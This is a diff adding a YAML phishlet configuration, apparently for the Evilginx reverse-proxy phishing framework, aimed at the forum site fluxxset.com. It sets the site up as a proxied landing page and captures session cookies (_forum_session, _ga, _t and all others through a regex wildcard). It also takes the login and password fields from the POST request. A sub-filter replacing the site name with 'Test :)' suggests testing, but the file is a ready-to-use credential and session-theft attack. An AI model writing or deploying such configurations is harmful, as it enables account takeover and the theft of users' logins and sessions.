@@ -1,0 +1,26 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'fluxxset.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'fluxxset.com', orig_sub: '', domain: 'fluxxset.com', search: 'fluxxset', replace: 'Test :)', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.fluxxset.com'
+    keys: ['_forum_session',"_ga","_t",'.*,regexp'] 
+  - domain: 'fluxxset.com'
+    keys: ['_forum_session',"_ga","_t",'.*,regexp'] 
+auth_urls:
+  - '/'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'fluxxset.com'
+  path: '/login'
+
+
